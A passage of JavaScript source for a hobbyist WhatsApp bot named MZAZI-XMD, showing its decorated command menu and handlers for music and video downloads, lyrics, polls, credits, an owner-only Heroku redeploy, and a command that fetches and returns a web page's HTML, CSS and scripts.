●═══  〘 𝗖𝗢𝗗𝗜𝗡𝗚 𝐂𝐌𝐃𝐒 〙 ═───═●
╭══───────◇───────══╮
┃💥│ 𝗖𝗮𝗿𝗯𝗼𝗻
┃💥│ 𝗖𝗼𝗺𝗽𝗶𝗹𝗲-𝗰
┃💥│ 𝗖𝗼𝗺𝗽𝗶𝗹𝗲-𝗰++
┃💥│ 𝗖𝗼𝗺𝗽𝗶𝗹𝗲-𝗷𝘀
┃💥│ 𝗖𝗼𝗺𝗽𝗶𝗹𝗲-𝗽𝘆
┃💥│ 𝗜𝗻𝘀𝗽𝗲𝗰𝘁
┃💥│ 𝗘𝗻𝗰𝗿𝘆𝗽𝘁𝗲
┃💥│ 𝗘𝗻𝗰-𝗵
┃💥│ 𝗘𝗻𝗰𝗿𝘆𝗽𝘁-𝗵
┃💥│ 𝗘𝘃𝗮𝗹
╰══───────◇───────══╯
●═══  〘 𝗚𝗘𝗡𝗘𝗥𝗔𝗟 𝐂𝐌𝐃𝐒 〙 ═───═●
╭══───────◇───────══╮
┃💥│ 𝗢𝘄𝗻𝗲𝗿
┃💥│ 𝗦𝗰𝗿𝗶𝗽𝘁
┃💥│ 𝗦𝗰
┃💥│ 𝗟𝗶𝘀𝘁
┃💥│ 𝗣𝗶𝗻𝗴
┃💥│ 𝗣𝗼𝗹𝗹
┃💥│ 𝗔𝗹𝗶𝘃𝗲
┃💥│ 𝗦𝗽𝗲𝗲𝗱
┃💥│ 𝗥𝗲𝗽𝗼
┃💥│ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲
┃💥│ 𝗨𝗽𝘁𝗶𝗺𝗲
┃💥│ 𝗗𝗽
┃💥│ 𝗗𝗹𝘁
┃💥│ 𝗠𝗮𝗶𝗹
┃💥│ 𝗜𝗻𝗯𝗼𝘅
┃💥│ 𝗡𝗲𝘄𝘀
┃💥│ 𝗔𝗻𝗶𝗺𝗲
╰══───────◇───────══╯
●═══   〘 𝗢𝗪𝗡𝗘𝗥 𝐂𝐌𝐃𝐒  〙═───═●
╭══───────◇───────══╮
┃💥│ 𝗥𝗲𝘀𝘁𝗮𝗿𝘁
┃💥│ 𝗔𝗱𝗺𝗶𝗻
┃💥│ 𝗖𝗮𝘀𝘁
┃💥│ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁
┃💥│ 𝗝𝗼𝗶𝗻
┃💥│ 𝗚𝗲𝘁𝘃𝗮𝗿
┃💥│ 𝗥𝗲𝗱𝗲𝗽𝗹𝗼𝘆
┃💥│ 𝗨𝗽𝗱𝗮𝘁𝗲
┃💥│ 𝗦𝗲𝘁𝘃𝗮𝗿
┃💥│ 𝗕𝗼𝘁𝗽𝗽
┃💥│ 𝗙𝘂𝗹𝗹𝗽𝗽
┃💥│ 𝗕𝗹𝗼𝗰𝗸
┃💥│ 𝗨𝗻𝗯𝗼𝗰𝗸
┃💥│ 𝗞𝗶𝗹𝗹
┃💥│ 𝗞𝗶𝗹𝗹2
┃💥│ 𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗲
┃💥│ 𝗦𝗮𝘃𝗲
┃💥│ >
┃💥│ 𝗧𝗲𝗺𝗽𝗲𝗺𝗮𝗶𝗹
╰══───────◇───────══╯
●═══   〘 𝗣𝗥𝗔𝗡𝗞 𝐂𝐌𝐃  〙 ═──═●
╭══───────◇───────══╮
┃💥│ 𝗛𝗮𝗰𝗸
┃💥│ 𝗩𝗶𝗿𝘂𝘀𝗵𝗮𝗰𝗸
╰══───────◇───────══╯
●═══ 〘 𝗘𝗡𝗧𝗘𝗥𝗧𝗔𝗜𝗡𝗠𝗘𝗡𝗧 〙 ═──═●
╭══───────◇───────══╮
┃💥│ 𝗩𝗶𝗿𝗴𝗶𝗻𝗶𝘁𝘆𝘁𝗲𝘀𝘁
┃💥│ 𝗩𝗶𝗿𝗴𝗶𝗻𝗶𝘁𝘆𝗿𝗮𝘁𝗲
┃💥│ 𝗙𝗼𝗼𝗹𝘁𝗲𝘀𝘁
┃💥│ 𝗙𝗼𝗼𝗹𝗿𝗮𝘁𝗲
┃💥│ 𝗛𝗼𝗿𝗻𝘆𝘁𝗲𝘀𝘁
┃💥│ 𝗖𝗵𝗲𝗰𝗸𝗺𝗲
┃💥│ 𝗖𝗵𝗲𝗰𝗸𝗮𝗹𝗹
╰══───────◇───────══╯
●═══   〘 𝗟𝗢𝗚𝗢𝗦 𝐂𝐌𝐃𝐒 〙 ═──═●
╭══───────◇───────══╮
┃💥│ 𝗛𝗮𝗰𝗸𝗲𝗿
┃💥│ 𝗛𝗮𝗰𝗸𝗲𝗿2
┃💥│ 𝗚𝗿𝗮𝗳𝗳𝗶𝘁𝗶
┃💥│ 𝗖𝗮𝘁
┃💥│ 𝗦𝗮𝗻𝗱
┃💥│ 𝗚𝗼𝗹𝗱
┃💥│ 𝗔𝗿𝗲𝗻𝗮
┃💥│ 𝗗𝗿𝗮𝗴𝗼𝗻𝗯𝗮𝗹𝗹
┃💥│ 𝗡𝗮𝗿𝘂𝘁𝗼
┃💥│ 𝗖𝗵𝗶𝗹𝗱
┃💥│ 𝗟𝗲𝗮𝘃𝗲𝘀
┃💥│ 1917
┃💥│ 𝗧𝘆𝗽𝗼𝗴𝗿𝗮𝗽𝗵𝘆
╰══───────◇───────══╯
●═══ 〘  𝐋𝐎𝐕𝐄 𝐂𝐌𝐃𝐒  〙═──═●
╭══───────◇───────══╮
┃💥│ 𝗟𝗼𝘃𝗲𝗹𝗲𝘁𝘁𝗲𝗿 𝗿𝗼𝗺𝗮𝗻𝘁𝗶𝗰
┃💥│ 𝗟𝗼𝘃𝗲𝗹𝗲𝘁𝘁𝗲𝗿 𝗱𝗲𝗲𝗽
┃💥│ 𝗟𝗼𝘃𝗲𝗹𝗲𝘁𝘁𝗲𝗿 𝗳𝘂𝗻𝗻𝘆
┃💥│ 𝗟𝗼𝘃𝗲𝗹𝗲𝘁𝘁𝗲𝗿 𝗹𝗲𝘀𝗯𝗶𝗮𝗻
┃💥│ 𝗟𝗼𝘃𝗲𝗹𝗲𝘁𝘁𝗲𝗿 𝗴𝗮𝘆
┃💥│ 𝗟𝗼𝘃𝗲𝗹𝗲𝘁𝘁𝗲𝗿 𝗵𝗲𝗮𝗿𝘁𝗯𝗿𝗲𝗮𝗸
╰══───────◇───────══╯
●═══ 〘  𝗧𝗘𝗫𝗧𝗠𝗔𝗞𝗘𝗥 𝐂𝐌𝐃𝐒  〙═──═●
╭══───────◇───────══╮
┃💥│ 𝗣𝘂𝗿𝗽𝗹𝗲
┃💥│ 𝗡𝗲𝗼𝗻
┃💥│ 𝗡𝗼𝗲𝗹
┃💥│ 𝗠𝗲𝘁𝗮𝗹𝗹𝗶𝗰
┃💥│ 𝗗𝗲𝘃𝗶𝗹
┃💥│ 𝗜𝗺𝗽𝗿𝗲𝘀𝘀𝗶𝘃𝗲
┃💥│ 𝗦𝗻𝗼𝘄
┃💥│ 𝗪𝗮𝘁𝗲𝗿
┃💥│ 𝗧𝗵𝘂𝗻𝗱𝗲𝗿
┃💥│ 𝗜𝗰𝗲
┃💥│ 𝗠𝗮𝘁𝗿𝗶𝘅
┃💥│ 𝗦𝗶𝗹𝘃𝗲𝗿
┃💥│ 𝗟𝗶𝗴𝗵𝘁
╰══───────◇───────══╯
●═══   〘 𝗠𝗜𝗦𝗖 𝐂𝐌𝐃 〙 ═──═●
╭══───────◇───────══╮
┃💥│ 𝗪𝗲𝗮𝘁𝗵𝗲𝗿
┃💥│ 𝗚𝗶𝘁𝗵𝘂𝗯
┃💥│ 𝗚𝗶𝘁𝗰𝗹𝗼𝗻𝗲
┃💥│ 𝗔𝗱𝘃𝗶𝗰𝗲
┃💥│ 𝗥𝗲𝗺𝗼𝘃𝗲𝗯𝗴
┃💥│ 𝗥𝗲𝗺𝗶𝗻𝗶
┃💥│ 𝗧𝘁𝘀
┃💥│ 𝗧𝗿𝘁
┃💥│ 𝗙𝗮𝗰𝘁
┃💥│ 𝗖𝗮𝘁𝗳𝗮𝗰𝘁
┃💥│ 𝗤𝘂𝗼𝘁𝗲𝘀
┃💥│ 𝗣𝗶𝗰𝗸𝘂𝗽𝗹𝗶𝗻𝗲
╰══───────◇───────══╯
●═══  〘 𝗢𝗧𝗛𝗘𝗥𝗦 𝐂𝐌𝐃𝐒 〙 ═──═●
╭══───────◇───────══╮
┃💥│ 𝗖𝗿𝗲𝗱𝗶𝘁𝘀
┃💥│ 𝗨𝗽𝗹𝗼𝗮𝗱
┃💥│ 𝗔𝘁𝘁𝗽
┃💥│ 𝗨𝗿𝗹
┃💥│ 𝗜𝗺𝗮𝗴𝗲
┃💥│ 𝗦𝘆𝘀𝘁𝗲𝗺
┃✫╰═───────◇───────═╯
┃   𝗠𝗮𝗱𝗲 𝗶𝗻 𝗞𝗲𝗻𝘆𝗮 𝗕𝘆 𝗠𝗭𝗔𝗭𝗜🤩
┃   𝗕𝗘𝗦𝗧 𝗫𝗠𝗗 𝗕𝗢𝗧 𝗜𝗡 𝗨𝗡𝗜𝗩𝗘𝗥𝗦𝗘
┃   🆃🅷🅰🅽🅺🆂 🆃🅾
┃  ✦𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖊𝖗 (𝙼𝚉𝙰𝚉𝙸)
┃  ✦𝕭𝖆𝖘𝖊 (𝙽𝚒𝚌𝚔)    
┃  ✦𝕸𝖞 𝕲𝖎𝖗𝖑𝖋𝖗𝖎𝖊𝖓𝖉 (𝚆𝚒𝚗𝚡𝚎𝚢) 
┃  ✦𝖋𝖗𝖎𝖊𝖓𝖉𝖘 (𝚒𝚗𝚌. 𝙹𝚞𝚗𝚒𝚘𝚞𝚛, 𝙹𝚊𝚖𝚎𝚜, 𝙷𝚊𝚛𝚛𝚢𝚔𝚎𝚗, TheChillGuy 𝚊𝚗𝚍 𝚂𝚝𝚒𝚗𝚐𝚎𝚛)
┃  ✦𝕒𝕟𝕕 𝕒𝕝𝕝 𝕠𝕗 𝕪𝕠𝕦🙂
╰══────────────────══╯`;

if (menu === 'VIDEO') {

                   client.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/menu.mp4'),
                        caption: cap,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (menu === 'TEXT') {
client.sendMessage(from, { text: cap}, {quoted: m})

} else if (menu === 'IMAGE') {
client.sendMessage(m.chat, { image: { url: 'https://i.imgur.com/A08nrWx.jpeg' }, caption: cap, fileLength: "9999999999"}, { quoted: m })
} else if (menu === 'LINK') {
client.sendMessage(m.chat, {
                        text: cap,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`,
                                body: `${runtime(process.uptime())}`,
                                thumbnail: fs.readFileSync('./Media/mzazi.jpg'),
                                sourceUrl: 'https://wa.me/254741388986?text=Hello👋+Mzazi+Nihostie+Bot+Mkuu+😔',
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })

}
          // Group Commands
break;


case "advice":
reply(advice());
console.log(advice());

break;

case "owner": case "developer": case "dev":
client.sendContact(from, maindev2, m)
break;

		      case "lyrics2": 
 try { 
 if (!text) return reply("𝑷𝒓𝒐𝒗𝒊𝒅𝒆 𝒂 𝒔𝒐𝒏𝒈 𝒏𝒂𝒎𝒆!\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗"); 
 const searches = await Client.songs.search(text); 
 const firstSong = searches[0]; 
 //await client.sendMessage(from, {text: firstSong}); 
 const lyrics = await firstSong.lyrics(); 
 await client.sendMessage(from, { text: lyrics}, { quoted: m }); 
 } catch (error) { 
             reply(`𝑰 𝒅𝒊𝒅 𝒏𝒐𝒕 𝒈𝒊𝒏𝒅 𝒂𝒏𝒚 𝒍𝒚𝒓𝒊𝒄𝒔 𝒇𝒐𝒓 ${text}. 𝑻𝒓𝒚 𝒔𝒆𝒂𝒓𝒄𝒉𝒊𝒏𝒈 𝒂 𝒅𝒊𝒇𝒇𝒆𝒓𝒆𝒏𝒕 𝒔𝒐𝒏𝒈.\n\n> ©𝖕𝖔𝖜𝖊𝖗 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`); 
             console.log(error); 
         } 
 //const artist = await Client.artists.get(456537); 
 //await client.sendMessage(from, { text: artist} {quoted: m}); 
 // console.log("About the Artist:\n", artist, "\n"); 
 break;
        
	case "play2": {
 const yts = require("yt-search");

    try {
        if (!text) return m.reply("𝑾𝒉𝒂𝒕 𝒔𝒐𝒏𝒈 𝒅𝒐 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅?\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");

        const { videos } = await yts(text);
        if (!videos || videos.length === 0) {
            return m.reply("𝑵𝒐 𝒔𝒐𝒏𝒈 𝒇𝒐𝒖𝒏𝒅!\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");
        }

        const urlYt = videos[0].url;

        try {
            let data = await fetchJson(`https://api.dreaded.site/api/ytdl/audio?url=${urlYt}`);

            const { title, format, url: audioUrl } = data.result;

            await client.sendMessage(
                m.chat,
                {
                    document: { url: audioUrl },
                    mimetype: "audio/mpeg",
		    caption: "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗",
                    fileName: `${title}.mp3`,
                },
                { quoted: m }
            );
        } catch (error) {
            console.error("API request failed:", error.message);
            m.reply("𝑫𝒐𝒘𝒏𝒍𝒐𝒂𝒅 𝒇𝒂𝒊𝒍𝒆𝒅: 𝑼𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒓𝒆𝒕𝒓𝒊𝒆𝒗𝒆.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");
        }
    } catch (error) {
        m.reply("Download failed\n" + error.message);
    }
};
        break;

	      case "music": {
const yts = require("yt-search");
const fetch = require("node-fetch"); 

  try {
    
    if (!text) {
      return m.reply("𝑾𝒉𝒂𝒕 𝒔𝒐𝒏𝒈 𝒅𝒐 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");
    }

    let search = await yts(text);
    if (!search.all.length) {
      return sendReply(client, m, "No results found for your query.");
    }
    let link = search.all[0].url; 

    const apiUrl = `https://keith-api.vercel.app/download/dlmp3?url=${link}`;

    let response = await fetch(apiUrl);
    let data = await response.json();

    
    if (data.status && data.result) {
      const audioData = {
        title: data.result.title,
        downloadUrl: data.result.downloadUrl,
        thumbnail: search.all[0].thumbnail,
        format: data.result.format,
        quality: data.result.quality,
      };

await client.sendMessage(
        m.chat,
        {
          document: { url: audioData.downloadUrl },
          mimetype: "audio/mp3",
	  caption: "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗",
          fileName: `${audioData.title.replace(/[^a-zA-Z0-9 ]/g, "")}.mp3`,
        },
        { quoted: m }
      );

await client.sendMessage(
        m.chat,
        {
          audio: { url: audioData.downloadUrl },
          mimetype: "audio/mp4",
        },
        { quoted: m }
      );

      return;
    } else {
      
      return reply("𝑼𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒇𝒆𝒕𝒄𝒉 𝒕𝒉𝒆 𝒔𝒐𝒏𝒈. 𝑻𝒓𝒚 𝒂𝒈𝒂𝒊𝒏 𝒍𝒂𝒕𝒆𝒓.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");
    }
  } catch (error) {
    
    return reply(`𝑨𝒏 𝒆𝒓𝒓𝒐𝒓 𝒐𝒄𝒄𝒖𝒓𝒆𝒅: `);
  }
}
	break;

	      case 'video': {
const yts = require("yt-search");
const fetch = require("node-fetch"); 

  try { 
    if (!text) {
      return sendReply(client, m, "𝑷𝒍𝒆𝒂𝒔𝒆 𝒔𝒑𝒆𝒄𝒊𝒇𝒚 𝒕𝒉𝒆 𝒗𝒊𝒅𝒆𝒐 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖍𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");
    }
 
    let search = await yts(text);
    if (!search.all.length) {
      return sendReply(client, m, "No results found for your query.");
    }
    let link = search.all[0].url; 

    const apiUrl = `https://apis-keith.vercel.app/download/dlmp4?url=${link}`;

    let response = await fetch(apiUrl);
    let data = await response.json();

    if (data.status && data.result) {
      const videoData = {
        title: data.result.title,
        downloadUrl: data.result.downloadUrl,
        thumbnail: search.all[0].thumbnail,
        format: data.result.format,
        quality: data.result.quality,
      };

      await client.sendMessage(
        m.chat,
        {
          video: { url: videoData.downloadUrl },
          mimetype: "video/mp4",
          caption: "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗",
        },
        { quoted: m }
      );

      return;
    } else {
      
      return reply(client, m, "𝑼𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒇𝒆𝒕𝒄𝒉 𝒕𝒉𝒆 𝒗𝒊𝒅𝒆𝒐. 𝑷𝒍𝒆𝒂𝒔𝒆 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏 𝒍𝒂𝒕𝒆𝒓, 𝒎𝒛𝒂𝒛𝒊 𝒊𝒔 𝒇𝒐𝒓 𝒚𝒐𝒖😂.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");
    }
  } catch (error) {
 
    return reply(client, m, `An error occurred: ${error.message}`);
  }
};
  break;
		      
	      case "update": case "redeploy": {
		      const axios = require('axios');

		if(!Owner) throw NotOwner;
		     if (!appname || !herokuapi) {
            await m.reply("𝑰𝒕 𝒍𝒐𝒐𝒌𝒔 𝒍𝒊𝒌𝒆 𝒕𝒉𝒆 𝒉𝒆𝒓𝒐𝒌𝒖 𝒂𝒑𝒑 𝒏𝒂𝒎𝒆 𝒐𝒓 𝑨𝑷𝑰 𝒌𝒆𝒚 𝒊𝒔 𝒏𝒐𝒕 𝒔𝒆𝒕. 𝑷𝒍𝒆𝒂𝒔𝒆 𝒎𝒂𝒌𝒆 𝒔𝒖𝒓𝒆 𝒚𝒐𝒖 𝒉𝒂𝒗𝒆 𝒔𝒆𝒕 𝒕𝒉𝒆 `APP_NAME` 𝒂𝒏𝒅 `HEROKU_API` 𝒆𝒏𝒗𝒊𝒓𝒐𝒏𝒎𝒆𝒏𝒕 𝒗𝒂𝒓𝒊𝒂𝒃𝒍𝒆𝒔.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");
            return;
        }

        async function redeployApp() {
            try {
                const response = await axios.post(
                    `https://api.heroku.com/apps/${appname}/builds`,
                    {
                        source_blob: {
                            url: "https://github.com/TeddyDommie/MZAZI-XMD/tarball/main",
                        },
                    },
                    {
                        headers: {
                            Authorization: `Bearer ${herokuapi}`,
                            Accept: "application/vnd.heroku+json; version=3",
                        },
                    }
                );

                await m.reply("𝑴𝒁𝑨𝒁𝑰-𝑿𝑴𝑫 𝑩𝒐𝒕 𝒊𝒔 𝒖𝒏𝒅𝒆𝒓𝒈𝒐𝒊𝒏𝒈 𝒂 𝒓𝒖𝒕𝒉𝒍𝒆𝒔𝒔 𝒖𝒑𝒈𝒓𝒂𝒅𝒆, 𝒉𝒐𝒍𝒅 𝒐𝒏 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒏𝒆𝒙𝒕 2 𝒎𝒊𝒏𝒖𝒕𝒆𝒔 𝒂𝒔 𝒕𝒉𝒆 𝒓𝒆𝒅𝒆𝒑𝒍𝒐𝒚 𝒆𝒙𝒆𝒄𝒖𝒕𝒆𝒔! 𝑶𝒏𝒄𝒆 𝒅𝒐𝒏𝒆𝒆, 𝒚𝒐𝒖 𝒘𝒊𝒍𝒍 𝒉𝒂𝒗𝒆 𝒕𝒉𝒆 𝒇𝒓𝒆𝒔𝒉𝒆𝒔𝒕 𝒗𝒆𝒓𝒔𝒊𝒐𝒏 𝒐𝒇 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝒖𝒏𝒍𝒆𝒂𝒔𝒉𝒆𝒅 𝒖𝒑𝒐𝒏 𝒚𝒐𝒖.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");
                console.log("Build details:", response.data);
            } catch (error) {
                const errorMessage = error.response?.data || error.message;
                await m.reply(`𝑭𝒂𝒊𝒍𝒆𝒅 𝒕𝒐 𝒖𝒑𝒅𝒂𝒕𝒆 𝒂𝒏𝒅 𝒓𝒆𝒅𝒆𝒑𝒍𝒐𝒚. 𝑪𝒉𝒆𝒄𝒌 𝒊𝒇 𝒚𝒐𝒖 𝒉𝒂𝒗𝒆 𝒔𝒆𝒕 𝒕𝒉𝒆 𝒉𝒆𝒓𝒐𝒌𝒖 𝑨𝑷𝑰 𝒌𝒆𝒚 𝒂𝒏𝒅 𝒂𝒑𝒑 𝒏𝒂𝒎𝒆 𝒄𝒐𝒓𝒓𝒆𝒄𝒕𝒍𝒚.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`);
                console.error("Error triggering redeploy:", errorMessage);
            }
        }

        redeployApp();
    }
	break;
		      
		      case "credits": 
  
              client.sendMessage(m.chat, { image: { url: 'https://i.imgur.com/nhNVsqf.jpeg' }, caption: `We express sincere gratitude and acknowledgement to the following:\n\n -Nick ➪ Kenya\n - Writing the base code using case method\nhttps://github.com/HunterNick2\n\n -Mzazi ➪ Kenya\n - Founder of the bot base\nhttps://github.com/TeddyDommie\n\n𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`}, { quoted: m}); 
 break;
		      
	  case 'poll': {
		  let [poll, opt] = text.split("|")

if (text.split("|") < 2)
                return m.reply(`Wrong format::\nExample:- poll who is the best developer|Putin, Mzazi\n\n> ©𝕻𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`);

let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await client.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
         
   })

	  }
		break;


case 'play': {
  const axios = require('axios');
  const yts = require("yt-search");
  const ffmpeg = require("fluent-ffmpeg");
  const fs = require("fs");
  const path = require("path");

  try {
    if (!text) return m.reply("What song do you want to download?\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");

    let search = await yts(text);
    let songInfo = search.all[0];
    let link = songInfo.url;

    const apis = [
      `https://xploader-api.vercel.app/ytmp3?url=${link}`,
      `https://apis.davidcyriltech.my.id/youtube/mp3?url=${link}`,
      `https://api.ryzendesu.vip/api/downloader/ytmp3?url=${link}`,
      `https://api.dreaded.site/api/ytdl/audio?url=${link}`
    ];

    // Prepare song info caption
    let songDetails = `*🎵 Song Info*
*Title:* ${songInfo.title}
*Artist/Channel:* ${songInfo.author.name}
*Duration:* ${songInfo.timestamp}
*Views:* ${songInfo.views.toLocaleString()}
*Uploaded:* ${songInfo.ago}
*Link:* can't provide the link to avoid you being removed from the group with other stupid bots due to antilink, I carr about you my user`;

    // Send song thumbnail with caption
    await client.sendMessage(m.chat, {
      image: { url: songInfo.image },
      caption: songDetails
    }, { quoted: m });

    // Try each API
    for (const api of apis) {
      try {
        let data = await fetchJson(api);

        if (data.status === 200 || data.success) {
          let videoUrl = data.result?.downloadUrl || data.url;
          let outputFileName = `${songInfo.title.replace(/[^a-zA-Z0-9 ]/g, "")}.mp3`;
          let outputPath = path.join(__dirname, outputFileName);

          const response = await axios({
            url: videoUrl,
            method: "GET",
            responseType: "stream"
          });

          if (response.status !== 200) {
            m.reply("Sorry but the API endpoint didn't respond correctly. Try again later.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");
            continue;
          }

          ffmpeg(response.data)
            .toFormat("mp3")
            .save(outputPath)
            .on("end", async () => {
              await client.sendMessage(
                m.chat,
                {
                  document: { url: outputPath },
                  mimetype: "audio/mp3",
                  caption: "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗",
                  fileName: outputFileName,
                },
                { quoted: m }
              );
              fs.unlinkSync(outputPath);
            })
            .on("error", (err) => {
              m.reply("Download failed\n" + err.message);
            });

          return;
        }
      } catch (e) {
        continue;
      }
    }

    m.reply("𝑨𝒏 𝒆𝒓𝒓𝒐𝒓 𝒐𝒄𝒄𝒖𝒓𝒆𝒅. 𝑨𝑳𝑳 𝑨𝑷𝑰𝒔 𝒎𝒊𝒈𝒉𝒕 𝒃𝒆 𝒅𝒐𝒘𝒏 𝒐𝒓 𝒖𝒏𝒂𝒃𝒍𝒆 𝒕𝒐 𝒑𝒓𝒐𝒄𝒆𝒔𝒔 𝒕𝒉𝒆 𝒓𝒆𝒒𝒖𝒆𝒔𝒕.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");
  } catch (error) {
    m.reply("Download failed\n" + error.message);
  }
}
break;
	      case "inspect": {
		      const fetch = require('node-fetch');
const cheerio = require('cheerio');

    if (!text) return m.reply("𝑷𝒓𝒐𝒗𝒊𝒅𝒆 𝒂 𝒗𝒂𝒍𝒊𝒅 𝒘𝒆𝒃 𝒍𝒊𝒏𝒌 𝒕𝒐 𝒇𝒆𝒕𝒄𝒉! 𝑻𝒉𝒊𝒔 𝑩𝒐𝒕 𝒘𝒊𝒍𝒍 𝒄𝒓𝒂𝒘𝒍 𝒕𝒉𝒆 𝒘𝒆𝒃𝒔𝒊𝒕𝒆 𝒂𝒏𝒅 𝒇𝒆𝒕𝒄𝒉 𝒊𝒕𝒔 HTML, CSS, JavaScript, 𝒂𝒏𝒅 𝒂𝒏𝒚 𝒎𝒆𝒅𝒊𝒂 𝒆𝒎𝒃𝒆𝒅𝒅𝒆𝒅 𝒊𝒏 𝒊𝒕.\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");

    if (!/^https?:\/\//i.test(text)) {
        return m.reply("𝑷𝒍𝒆𝒂𝒔𝒆 𝒑𝒓𝒐𝒗𝒊𝒅𝒆 𝒂 𝒍𝒊𝒏𝒌 𝒔𝒕𝒂𝒓𝒕𝒊𝒏𝒈 𝒘𝒊𝒕𝒉 http:// or https://\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗");
    }

    try {
        const response = await fetch(text);
        const html = await response.text();
        const $ = cheerio.load(html);

        const mediaFiles = [];
        $('img[src], video[src], audio[src]').each((i, element) => {
            let src = $(element).attr('src');
            if (src) {
                mediaFiles.push(src);
            }
        });

        const cssFiles = [];
        $('link[rel="stylesheet"]').each((i, element) => {
            let href = $(element).attr('href');
            if (href) {
                cssFiles.push(href);
            }
        });

        const jsFiles = [];
        $('script[src]').each((i, element) => {
            let src = $(element).attr('src');
            if (src) {
                jsFiles.push(src);
            }
        });

        await m.reply(`**Full HTML Content**:\n\n${html}`);

        if (cssFiles.length > 0) {
            for (const cssFile of cssFiles) {
                const cssResponse = await fetch(new URL(cssFile, text));
                const cssContent = await cssResponse.text();
                await m.reply(`**CSS File Content**:\n\n${cssContent}`);
            }
        } else {
            await m.reply("No external CSS files found.");
        }

        if (jsFiles.length > 0) {
            for (const jsFile of jsFiles) {
                const jsResponse = await fetch(new URL(jsFile, text));
                const jsContent = await jsResponse.text();
                await m.reply(`**JavaScript File Content**:\n\n${jsContent}`);
            }
        } else {
            await m.reply("No external JavaScript files found.");
        }

        if (mediaFiles.length > 0) {
            await m.reply(`**Media Files Found**:\n${mediaFiles.join('\n')}`);
        } else {
            await m.reply("No media files (images, videos, audios) found.");
        }

    } catch (error) {
        console.error(error);
        return m.reply("An error occurred while fetching the website content.");
    }
}
	break;
		      
	      case 'metallic': {
		      var mumaker = require("mumaker");
		     if (!text || text == "") {
